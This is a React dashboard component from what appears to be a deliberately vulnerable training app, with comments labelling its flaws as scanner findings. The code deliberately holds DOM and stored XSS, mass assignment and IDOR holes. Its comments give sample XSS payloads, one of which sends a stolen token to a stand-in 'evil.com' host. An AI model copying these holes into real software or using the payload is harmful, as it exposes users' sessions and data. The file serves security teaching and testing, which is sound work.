import React, { useState, useEffect } from 'react';
import api from '../services/api';

/**
 * Dashboard Component
 *
 * DAST Finding: DOM XSS via dangerouslySetInnerHTML with API-returned description (CWE-79)
 * DAST Finding: IDOR — project IDs sequential, no ownership enforced (CWE-639)
 * SAST Finding: Role and user info read from localStorage — tamper-prone (CWE-807)
 */
function Dashboard() {
  const [projects,    setProjects]    = useState([]);
  const [newProject,  setNewProject]  = useState({ name: '', description: '', user_id: '', status: 'active', priority: 'medium' });
  const [loading,     setLoading]     = useState(true);
  const [notification,setNotification]= useState('');

  // FIXME: User info read from localStorage — can be tampered by any script on the page
  const currentUser = (() => {
    try { return JSON.parse(localStorage.getItem('user') || '{}'); }
    catch { return {}; }
  })();

  useEffect(() => {
    fetchProjects();

    // DOM XSS: reading URL hash and injecting into page
    // Try: /dashboard#<img src=x onerror=alert(document.cookie)>
    if (window.location.hash) {
      const hashData = decodeURIComponent(window.location.hash.slice(1));
      const el = document.getElementById('hash-inject');
      if (el) el.innerHTML = hashData; // DOM XSS — unescaped hash content
    }
  }, []);

  const fetchProjects = async () => {
    setLoading(true);
    try {
      const res = await api.get('/api/projects'); // Public endpoint — no auth needed
      setProjects(res.data);
    } catch (err) {
      console.error('Failed to fetch projects:', err);
    } finally {
      setLoading(false);
    }
  };

  const createProject = async (e) => {
    e.preventDefault();
    try {
      // FIXME: Mass assignment — sending all newProject fields to server
      // Including user_id (attacker can override project ownership)
      await api.post('/projects', newProject);
      setNotification('Project created!');
      setNewProject({ name: '', description: '', user_id: '', status: 'active', priority: 'medium' });
      fetchProjects();
    } catch (err) {
      setNotification('Error: ' + (err.response?.data?.error || err.message));
    }
  };

  const deleteProject = async (id) => {
    if (!window.confirm(`Delete project #${id}? (No ownership check — you can delete ANY project)`)) return;
    try {
      await api.delete(`/projects/${id}`); // IDOR: deletes any project
      setNotification(`Project #${id} deleted`);
      fetchProjects();
    } catch (err) {
      console.error(err);
    }
  };

  const logout = () => {
    // FIXME: Token not invalidated server-side — still valid after "logout"
    localStorage.clear();
    window.location.href = '/login';
  };

  const s = {
    page:     { minHeight: '100vh', background: '#0f172a', fontFamily: "'Segoe UI',Arial,sans-serif" },
    navbar:   { background: 'rgba(30,41,59,0.95)', borderBottom: '1px solid rgba(255,255,255,0.08)', padding: '0 32px', height: 64, display: 'flex', alignItems: 'center', justifyContent: 'space-between', position: 'sticky', top: 0, zIndex: 100 },
    brand:    { fontSize: 20, fontWeight: 700, color: '#818cf8' },
    navLinks: { display: 'flex', gap: 24, alignItems: 'center' },
    navLink:  { color: '#94a3b8', textDecoration: 'none', fontSize: 14 },
    container:{ maxWidth: 1200, margin: '0 auto', padding: '32px 24px' },
    card:     { background: 'rgba(30,41,59,0.8)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: 12, padding: 24, marginBottom: 24 },
    h2:       { color: '#e2e8f0', fontSize: 22, fontWeight: 700, marginBottom: 20 },
    input:    { padding: '10px 14px', background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.12)', borderRadius: 8, color: '#e2e8f0', fontSize: 14, outline: 'none', marginRight: 8 },
    btnPrimary:{ padding: '10px 20px', background: 'linear-gradient(135deg,#6366f1,#8b5cf6)', color: 'white', border: 'none', borderRadius: 8, cursor: 'pointer', fontSize: 14, fontWeight: 600 },
    btnDanger: { padding: '8px 14px', background: '#ef4444', color: 'white', border: 'none', borderRadius: 6, cursor: 'pointer', fontSize: 13 },
    projGrid: { display: 'grid', gridTemplateColumns: 'repeat(auto-fill,minmax(320px,1fr))', gap: 16 },
    projCard: { background: 'rgba(15,23,42,0.8)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 12, padding: 20 },
    projName: { color: '#e2e8f0', fontSize: 16, fontWeight: 600, marginBottom: 8 },
    projDesc: { color: '#94a3b8', fontSize: 13, marginBottom: 12, lineHeight: 1.5 },
    notif:    { background: 'rgba(99,102,241,0.15)', border: '1px solid rgba(99,102,241,0.3)', borderRadius: 8, padding: '10px 16px', color: '#818cf8', fontSize: 13, marginBottom: 16 },
  };

  return (
    <div style={s.page}>
      <nav style={s.navbar}>
        <span style={s.brand}>🌑 ShadowDep</span>
        <div style={s.navLinks}>
          {/* FIXME: Username read from localStorage — DOM XSS if tampered */}
          <span style={{ color: '#e2e8f0', fontSize: 14 }}>
            Welcome, <strong style={{ color: '#818cf8' }}>{currentUser.username || 'User'}</strong>
            {' '}
            {/* Role from localStorage — easily spoofed by attacker */}
            <span style={{ color: '#fbbf24', fontSize: 12 }}>({localStorage.getItem('role') || 'user'})</span>
          </span>
          <a href="/admin" style={s.navLink}>⚙ Admin</a>
          <a href="/search" style={s.navLink}>🔍 Search</a>
          <button onClick={logout} style={{ ...s.btnDanger, padding: '6px 12px' }}>Logout</button>
        </div>
      </nav>

      {/* DOM XSS injection point from URL hash */}
      <div id="hash-inject" style={{ padding: '0 32px' }}></div>

      <div style={s.container}>

        {notification && (
          /* FIXME: Notification rendered without sanitization — XSS if server returns HTML */
          <div style={s.notif} dangerouslySetInnerHTML={{ __html: notification }} />
        )}

        {/* ─── Create Project Form ──────────────────────────────────── */}
        <div style={s.card}>
          <h2 style={s.h2}>➕ Create Project</h2>
          <form onSubmit={createProject} style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
            <input style={s.input} placeholder="Project name" value={newProject.name}
              onChange={e => setNewProject({ ...newProject, name: e.target.value })} required />
            <input style={{ ...s.input, width: 300 }} placeholder="Description (HTML allowed!)"
              value={newProject.description}
              onChange={e => setNewProject({ ...newProject, description: e.target.value })} />
            {/* MASS ASSIGNMENT: user_id exposed in form — attacker can assign any user_id */}
            <input style={{ ...s.input, width: 80 }} placeholder="user_id (IDOR)"
              value={newProject.user_id}
              onChange={e => setNewProject({ ...newProject, user_id: e.target.value })} />
            <select style={{ ...s.input, width: 120 }} value={newProject.status}
              onChange={e => setNewProject({ ...newProject, status: e.target.value })}>
              <option value="active">Active</option>
              <option value="pending">Pending</option>
              <option value="closed">Closed</option>
            </select>
            <select style={{ ...s.input, width: 120 }} value={newProject.priority}
              onChange={e => setNewProject({ ...newProject, priority: e.target.value })}>
              <option value="low">Low</option>
              <option value="medium">Medium</option>
              <option value="high">High</option>
              <option value="critical">Critical</option>
            </select>
            <button type="submit" style={s.btnPrimary}>Create</button>
          </form>
          <p style={{ color: '#475569', fontSize: 12, marginTop: 8 }}>
            💡 HTML in description will be rendered as-is (Stored XSS vector).
            user_id field allows mass assignment (IDOR).
          </p>
        </div>

        {/* ─── Project Grid ─────────────────────────────────────────── */}
        <h2 style={{ color: '#e2e8f0', fontSize: 22, fontWeight: 700, marginBottom: 20 }}>
          📋 Projects ({projects.length})
        </h2>

        {loading ? (
          <p style={{ color: '#475569', textAlign: 'center', padding: 40 }}>Loading...</p>
        ) : (
          <div style={s.projGrid}>
            {projects.map(project => (
              <div key={project.id} style={s.projCard}>
                <div style={s.projName}>
                  <a href={`/project/${project.id}`} style={{ color: '#e2e8f0', textDecoration: 'none' }}>
                    #{project.id} — {project.name}
                  </a>
                </div>

                {/*
                  DOM XSS: dangerouslySetInnerHTML with API-returned description.
                  If a project has description: <script>alert(1)</script>
                  or: <img src=x onerror="fetch('//evil.com/'+btoa(localStorage.getItem('token')))">
                  it will execute in the browser.
                  FIXME: Sanitize with DOMPurify before rendering.
                */}
                <div
                  style={s.projDesc}
                  dangerouslySetInnerHTML={{ __html: project.description }}
                />

                <div style={{ fontSize: 12, color: '#475569', marginBottom: 12 }}>
                  Status: <strong style={{ color: '#10b981' }}>{project.status}</strong>
                  &nbsp;|&nbsp;Priority: <strong style={{ color: '#ef4444' }}>{project.priority}</strong>
                  &nbsp;|&nbsp;Owner ID: <strong style={{ color: '#818cf8' }}>{project.user_id}</strong>
                  {/* Displaying user_id helps demonstrate IDOR */}
                </div>

                <div style={{ display: 'flex', gap: 8 }}>
                  <a href={`/project/${project.id}`} style={{ ...s.btnPrimary, fontSize: 12, padding: '6px 12px', textDecoration: 'none' }}>
                    View
                  </a>
                  <button style={s.btnDanger} onClick={() => deleteProject(project.id)}>
                    Delete (IDOR)
                  </button>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

export default Dashboard;
